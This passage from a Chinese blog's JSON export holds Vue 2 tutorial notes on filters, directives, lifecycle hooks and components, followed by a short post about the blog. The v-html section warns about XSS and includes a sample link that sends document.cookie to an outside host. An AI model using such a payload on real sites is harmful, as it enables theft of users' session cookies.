value=\"shanghai\"&gt;上海&lt;/option&gt; &lt;option value=\"shenzhen\"&gt;深圳&lt;/option&gt; &lt;option value=\"wuhan\"&gt;武汉&lt;/option&gt; &lt;/select&gt; &lt;br/&gt;&lt;br/&gt; 其他信息： &lt;textarea v-model.lazy=\"userInfo.other\"&gt;&lt;/textarea&gt; &lt;br/&gt;&lt;br/&gt; &lt;input type=\"checkbox\" v-model=\"userInfo.agree\"&gt;阅读并接受&lt;a href=\"http://www.blog.com\"&gt;《用户协议》&lt;/a&gt; &lt;button&gt;提交&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ userInfo:{ account:'', password:'', age:18, sex:'female', hobby:[], city:'beijing', other:'', agree:'' } }, methods: { demo(){ console.log(JSON.stringify(this.userInfo)) } } }) &lt;/script&gt; 十四、过滤器(Vue3已弃用)定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。语法： 注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}} 使用过滤器：{{ xxx | 过滤器名}} 或 v-bind:属性 = “xxx | 过滤器名” 备注： 过滤器也可以接收额外参数、多个过滤器也可以串联 并没有改变原本的数据, 是产生新的对应的数据 &lt;script type=\"text/javascript\" src=\"../js/dayjs.min.js\"&gt;&lt;/script&gt; //第三方库：记录时间 &lt;div id=\"root\"&gt; &lt;h2&gt;显示格式化后的时间&lt;/h2&gt; &lt;!-- 计算属性实现 --&gt; &lt;h3&gt;现在是：{{fmtTime}}&lt;/h3&gt; &lt;!-- methods实现 --&gt; &lt;h3&gt;现在是：{{getFmtTime()}}&lt;/h3&gt; &lt;!-- 过滤器实现 --&gt; &lt;h3&gt;现在是：{{time | timeFormater}}&lt;/h3&gt; &lt;!-- 过滤器实现（传参） --&gt; &lt;h3&gt;现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}&lt;/h3&gt; &lt;h3 :x=\"msg | mySlice\"&gt;Serein&lt;/h3&gt; &lt;/div&gt; &lt;div id=\"root2\"&gt; &lt;h2&gt;{{msg | mySlice}}&lt;/h2&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; //全局过滤器 Vue.filter('mySlice',function(value){ return value.slice(0,4) }) new Vue({ el:'#root', data:{ time:1621561377603, //时间戳 msg:'你好，Serein' }, computed: { fmtTime(){ return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss') } }, methods: { getFmtTime(){ return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss') } }, //局部过滤器 filters:{ timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){ // console.log('@',value) return dayjs(value).format(str) } } }) new Vue({ el:'#root2', data:{ msg:'hello,blog!' } }) &lt;/script&gt; 十五、内置指令1. v-text指令我们学过的指令： v-bind : 单向绑定解析表达式, 可简写为 :xxx v-model : 双向数据绑定 v-for : 遍历数组/对象/字符串 v-on : 绑定事件监听, 可简写为@ v-if : 条件渲染（动态控制节点是否存存在） v-else : 条件渲染（动态控制节点是否存存在） v-show : 条件渲染 (动态控制节点是否展示) v-text指令： 作用：向其所在的节点中渲染文本内容。 与插值语法的区别：v-text会替换掉节点中的内容，则不会。 &lt;div id=\"root\"&gt; &lt;div&gt;你好，{{name}}&lt;/div&gt; &lt;div v-text=\"name\"&gt;&lt;/div&gt; &lt;div v-text=\"str\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ name:'Serein', str:'&lt;h3&gt;你好啊！&lt;/h3&gt;' } }) &lt;/script&gt; 2. v-html指令v-html指令： 作用：向指定节点中渲染包含html结构的内容。 与插值语法的区别： v-html会替换掉节点中所有的内容，则不会。 v-html可以识别html结构。 严重注意：v-html有安全性问题！！！！ 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！ &lt;div id=\"root\"&gt; &lt;div&gt;你好，{{name}}&lt;/div&gt; &lt;div v-html=\"str\"&gt;&lt;/div&gt; &lt;div v-html=\"str2\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ name:'Serein', str:'&lt;h3&gt;你好啊！&lt;/h3&gt;', str2:'&lt;a href=javascript:location.href=\"http://www.baidu.com?\"+document.cookie&gt;兄弟我找到你想要的资源了，快来！&lt;/a&gt;', } }) &lt;/script&gt; 3. v-cloakv-cloak指令（没有值）： 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。 使用css配合v-cloak可以解决网速慢时页面展示出的问题。 &lt;style&gt; [v-cloak]{ display:none; } &lt;/style&gt; &lt;div id=\"root\"&gt; &lt;h2 v-cloak&gt;{{name}}&lt;/h2&gt; &lt;/div&gt; &lt;script type=\"text/javascript\" src=\"http://localhost:8080/resource/5s/vue.js\"&gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; console.log(1) new Vue({ el:'#root', data:{ name:'Serein' } }) &lt;/script&gt; 4. v-once指令 v-once所在节点在初次动态渲染后，就视为静态内容了。 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。 &lt;div id=\"root\"&gt; &lt;h2 v-once&gt;初始化的n值是:{{n}}&lt;/h2&gt; &lt;h2&gt;当前的n值是:{{n}}&lt;/h2&gt; &lt;button @click=\"n++\"&gt;点我n+1&lt;/button&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ n:1 } }) &lt;/script&gt; 5. v-pre指令 跳过其所在节点的编译过程。 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。 &lt;div id=\"root\"&gt; &lt;h2 v-pre&gt;Vue其实很简单&lt;/h2&gt; &lt;h2 &gt;当前的n值是:{{n}}&lt;/h2&gt; &lt;button @click=\"n++\"&gt;点我n+1&lt;/button&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ n:1 } }) &lt;/script&gt; 6. v-slotv-slot指令 作用：用于提供命名的插槽或需要接收prop的插槽 (具体使用请查看插槽知识点) 十六、自定义指令自定义指令总结： 一、定义语法： 局部指令：new Vue({ directives:{指令名:配置对象} 或 }) new Vue({ directives{指令名:回调函数} }) 全局指令： Vue.directive(指令名,配置对象) 或 Vue.directive(指令名,回调函数) 二、配置对象中常用的3个回调： bind：指令与元素成功绑定时调用。 inserted：指令所在元素被插入页面时调用。 update：指令所在模板结构被重新解析时调用。 三、备注： 指令定义时不加v-，但使用时要加v-； 指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。 &lt;div id=\"root\"&gt; &lt;h2&gt;{{name}}&lt;/h2&gt; &lt;h2&gt;当前的n值是：&lt;span v-text=\"n\"&gt;&lt;/span&gt; &lt;/h2&gt; &lt;!-- &lt;h2&gt;放大10倍后的n值是：&lt;span v-big-number=\"n\"&gt;&lt;/span&gt; &lt;/h2&gt; --&gt; &lt;h2&gt;放大10倍后的n值是：&lt;span v-big=\"n\"&gt;&lt;/span&gt; &lt;/h2&gt; &lt;button @click=\"n++\"&gt;点我n+1&lt;/button&gt; &lt;hr/&gt; &lt;input type=\"text\" v-fbind:value=\"n\"&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; //定义全局指令 Vue.directive('fbind',{ //指令与元素成功绑定时（一上来） bind(element,binding){ element.value = binding.value }, //指令所在元素被插入页面时 inserted(element,binding){ element.focus() }, //指令所在的模板被重新解析时 update(element,binding){ element.value = binding.value } }) new Vue({ el:'#root', data:{ name:'Serein', n:1 }, directives:{ //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。 //2.指令所在的模板被重新解析时。 'big-number'(element,binding){ // console.log('big') element.innerText = binding.value * 10 }, big(element,binding){ console.log('big',this) //注意此处的this是window // console.log('big') element.innerText = binding.value * 10 }, fbind:{ //指令与元素成功绑定时（一上来） bind(element,binding){ element.value = binding.value }, //指令所在元素被插入页面时 inserted(element,binding){ element.focus() }, //指令所在的模板被重新解析时 update(element,binding){ element.value = binding.value } } } }) &lt;/script&gt; 十七、生命周期1. 引出生命周期 又名：生命周期回调函数、生命周期函数、生命周期钩子。 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。 生命周期函数中的this指向是vm 或 组件实例对象。 &lt;div id=\"root\"&gt; &lt;h2 v-if=\"a\"&gt;你好啊&lt;/h2&gt; &lt;h2 :style=\"{opacity}\"&gt;欢迎学习Vue&lt;/h2&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ a:false, opacity:1 }, methods: { }, //Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted mounted(){ console.log('mounted',this) setInterval(() =&gt; { this.opacity -= 0.01 if(this.opacity &lt;= 0) this.opacity = 1 },16) }, }) //通过外部的定时器实现（不推荐） setInterval(() =&gt; { vm.opacity -= 0.01 if(vm.opacity &lt;= 0) vm.opacity = 1 },16) &lt;/script&gt; 2. 分析生命周期 3. 总结生命周期常用的生命周期钩子： mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。 beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。 关于销毁Vue实例 销毁后借助Vue开发者工具看不到任何信息。 销毁后自定义事件会失效，但原生DOM事件依然有效。 一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。 &lt;div id=\"root\"&gt; &lt;h2 :style=\"{opacity}\"&gt;欢迎学习Vue&lt;/h2&gt; &lt;button @click=\"opacity = 1\"&gt;透明度设置为1&lt;/button&gt; &lt;button @click=\"stop\"&gt;点我停止变换&lt;/button&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ opacity:1 }, methods: { stop(){ this.$destroy() } }, //Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted mounted(){ console.log('mounted',this) this.timer = setInterval(() =&gt; { console.log('setInterval') this.opacity -= 0.01 if(this.opacity &lt;= 0) this.opacity = 1 },16) }, beforeDestroy() { clearInterval(this.timer) console.log('vm即将驾鹤西游了') }, }) &lt;/script&gt; 十八、非单文件组件1. 基本使用Vue中使用组件的三大步骤： 一、定义组件(创建组件)二、注册组件三、使用组件(写组件标签) 一、如何定义一个组件？使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；区别如下： el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。 data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。 备注：使用template可以配置组件结构。 二、如何注册组件？ 局部注册：靠new Vue的时候传入components选项 全局注册：靠Vue.component(‘组件名’,组件) 三、编写组件标签：&lt;school&gt;&lt;/school&gt; &lt;div id=\"root\"&gt; &lt;hello&gt;&lt;/hello&gt; &lt;hr&gt; &lt;h1&gt;{{msg}}&lt;/h1&gt; &lt;hr&gt; &lt;!-- 第三步：编写组件标签 --&gt; &lt;school&gt;&lt;/school&gt; &lt;hr&gt; &lt;!-- 第三步：编写组件标签 --&gt; &lt;student&gt;&lt;/student&gt; &lt;/div&gt; &lt;div id=\"root2\"&gt; &lt;hello&gt;&lt;/hello&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; //第一步：创建school组件 const school = Vue.extend({ template:` &lt;div class=\"demo\"&gt; &lt;h2&gt;学校名称：{{schoolName}}&lt;/h2&gt; &lt;h2&gt;学校地址：{{address}}&lt;/h2&gt; &lt;button @click=\"showName\"&gt;点我提示学校名&lt;/button&gt; &lt;/div&gt; `, // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。 data(){ return { schoolName:'Serein', address:'Sereinblog昌平' } }, methods: { showName(){ alert(this.schoolName) } }, }) //第一步：创建student组件 const student = Vue.extend({ template:` &lt;div&gt; &lt;h2&gt;学生姓名：{{studentName}}&lt;/h2&gt; &lt;h2&gt;学生年龄：{{age}}&lt;/h2&gt; &lt;/div&gt; `, data(){ return { studentName:'张三', age:18 } } }) //第一步：创建hello组件 const hello = Vue.extend({ template:` &lt;div&gt; &lt;h2&gt;你好啊！{{name}}&lt;/h2&gt; &lt;/div&gt; `, data(){ return { name:'Tom' } } }) //第二步：全局注册组件 Vue.component('hello',hello) //创建vm new Vue({ el:'#root', data:{ msg:'你好啊！' }, //第二步：注册组件（局部注册） components:{ school, student } }) new Vue({ el:'#root2', }) &lt;/script&gt; 2. 几个注意点 关于组件名: 一个单词组成： 第一种写法(首字母小写)：school 第二种写法(首字母大写)：School 多个单词组成： 第一种写法(kebab-case命名)：my-school 第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持) 备注： 组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。 可以使用name配置项指定组件在开发者工具中呈现的名字。 关于组件标签: 第一种写法：&lt;school&gt;&lt;/school&gt; 第二种写法：&lt;school/&gt; 备注：不用使用脚手架时，会导致后续组件不能渲染。 一个简写方式： const school = Vue.extend(options) 可简写为：const school = options 3. 组件的嵌套&lt;div id=\"root\"&gt;&lt;/div&gt; &lt;script type=\"text/javascript\"&gt; //定义student组件 const student = Vue.extend({ name:'student', template:` &lt;div&gt; &lt;h2&gt;学生姓名：{{name}}&lt;/h2&gt; &lt;h2&gt;学生年龄：{{age}}&lt;/h2&gt; &lt;/div&gt; `, data(){ return { name:'Serein', age:18 } } }) //定义school组件 const school = Vue.extend({ name:'school', template:` &lt;div&gt; &lt;h2&gt;学校名称：{{name}}&lt;/h2&gt; &lt;h2&gt;学校地址：{{address}}&lt;/h2&gt; &lt;student&gt;&lt;/student&gt; &lt;/div&gt; `, data(){ return { name:'Serein', address:'Sereinblog' } }, //注册组件（局部） components:{ student } }) //定义hello组件 const hello = Vue.extend({ template:`&lt;h1&gt;{{msg}}&lt;/h1&gt;`, data(){ return { msg:'欢迎来到Serein学习！' } } }) //定义app组件 const app = Vue.extend({ template:` &lt;div&gt; &lt;hello&gt;&lt;/hello&gt; &lt;school&gt;&lt;/school&gt; &lt;/div&gt; `, components:{ school, hello } }) //创建vm new Vue({ template:'&lt;app&gt;&lt;/app&gt;', el:'#root', //注册组件（局部） components:{app} }) &lt;/script&gt; 4. VueComponent关于VueComponent： school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。 我们只需要写&lt;school/&gt;或&lt;school&gt;&lt;/school&gt;，Vue解析时会帮我们创建school组件的实例对象， 即Vue帮我们执行的：new VueComponent(options)。 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！ 关于this指向： 组件配置中： data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。 new Vue(options)配置中： data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。 VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。 Vue的实例对象，以后简称vm。 &lt;div id=\"root\"&gt; &lt;school&gt;&lt;/school&gt; &lt;hello&gt;&lt;/hello&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; //定义school组件 const school = Vue.extend({ name:'school', template:` &lt;div&gt; &lt;h2&gt;学校名称：{{name}}&lt;/h2&gt; &lt;h2&gt;学校地址：{{address}}&lt;/h2&gt; &lt;button @click=\"showName\"&gt;点我提示学校名&lt;/button&gt; &lt;/div&gt; `, data(){ return { name:'Serein', address:'Sereinblog' } }, methods: { showName(){ console.log('showName',this) } }, }) const test = Vue.extend({ template:`&lt;span&gt;blog&lt;/span&gt;` }) //定义hello组件 const hello = Vue.extend({ template:` &lt;div&gt; &lt;h2&gt;{{msg}}&lt;/h2&gt; &lt;test&gt;&lt;/test&gt; &lt;/div&gt; `, data(){ return { msg:'你好啊！' } }, components:{test} }) // console.log('@',school) // console.log('#',hello) //创建vm const vm = new Vue({ el:'#root', components:{school,hello} }) &lt;/script&gt; 5. 一个重要的内置关系VueComponent.prototype.proto === Vue.prototype 为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。 &lt;div id=\"root\"&gt; &lt;school&gt;&lt;/school&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; Vue.prototype.x = 99 //定义school组件 const school = Vue.extend({ name:'school', template:` &lt;div&gt; &lt;h2&gt;学校名称：{{name}}&lt;/h2&gt; &lt;h2&gt;学校地址：{{address}}&lt;/h2&gt; &lt;button @click=\"showX\"&gt;点我输出x&lt;/button&gt; &lt;/div&gt; `, data(){ return { name:'Serein', address:\"Sereinblog\" } }, methods: { showX(){ console.log(this.x) } }, }) //创建一个vm const vm = new Vue({ el:'#root', data:{ msg:'你好' }, components:{school} }) //定义一个构造函数 function Demo(){ this.a = 1 this.b = 2 } //创建一个Demo的实例对象 const d = new Demo() console.log(Demo.prototype) //显示原型属性 console.log(d.__proto__) //隐式原型属性 console.log(Demo.prototype === d.__proto__) //程序员通过显示原型属性操作原型对象，追加一个x属性，值为99 Demo.prototype.x = 99 console.log('@',d) &lt;/script&gt; 十九、单文件组件&lt;body&gt; &lt;!-- 准备一个容器 --&gt; &lt;div id=\"root\"&gt;&lt;/div&gt; &lt;script type=\"text/javascript\" src=\"../js/vue.js\"&gt;&lt;/script&gt; &lt;/body&gt; import App from './App.vue' new Vue({ el:'#root', template:`&lt;App&gt;&lt;/App&gt;`, components:{App}, }) &lt;template&gt; &lt;div&gt; &lt;School&gt;&lt;/School&gt; &lt;Student&gt;&lt;/Student&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; //引入组件 import School from './School.vue' import Student from './Student.vue' export default { name:'App', components:{ School, Student } } &lt;/script&gt; &lt;template&gt; &lt;div class=\"demo\"&gt; &lt;h2&gt;学校名称：{{name}}&lt;/h2&gt; &lt;h2&gt;学校地址：{{address}}&lt;/h2&gt; &lt;button @click=\"showName\"&gt;点我提示学校名&lt;/button&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name:'School', data(){ return { name:'Serein', address:'Sereinblog' } }, methods: { showName(){ alert(this.name) } }, } &lt;/script&gt; &lt;style&gt; .demo{ background-color: orange; } &lt;/style&gt; &lt;template&gt; &lt;div&gt; &lt;h2&gt;学生姓名：{{name}}&lt;/h2&gt; &lt;h2&gt;学生年龄：{{age}}&lt;/h2&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name:'Student', data(){ return { name:'张三', age:18 } } } &lt;/script&gt;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://serein.icu/categories/Vue/"}],"tags":[{"name":"Vue2","slug":"Vue2","permalink":"https://serein.icu/tags/Vue2/"}]},{"title":"博客与博主","slug":"01-博客诞生","date":"2022-03-11T02:07:00.000Z","updated":"2022-03-12T05:01:24.126Z","comments":true,"path":"posts/1.html","link":"","permalink":"https://serein.icu/posts/1.html","excerpt":"","text":"相遇皆是缘分 为什么建博客？纯属个人兴趣，拥有一个自己的博客，会有小许成就感吧，记录一些自己感兴趣的事或物。 展望博客我会整理一些个人所学的知识，以及在学习过程中遇到的一些难点和踩过的坑，或生活中有趣的事发到博客上与大家一同分享！ 关于博主热爱前端，不断前行 寄语： ​ Time waits for no one. ​ Treasure every moment you have. ​ 时间不等人，珍惜你所拥有的每分每秒吧！","categories":[{"name":"生活","slug":"生活","permalink":"https://serein.icu/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"想法","slug":"想法","permalink":"https://serein.icu/tags/%E6%83%B3%E6%B3%95/"}]}],"categories":[{"name":"Vue","slug":"Vue","permalink":"https://serein.icu/categories/Vue/"},{"name":"生活","slug":"生活","permalink":"https://serein.icu/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"Vue2","slug":"Vue2","permalink":"https://serein.icu/tags/Vue2/"},{"name":"想法","slug":"想法","permalink":"https://serein.icu/tags/%E6%83%B3%E6%B3%95/"}]}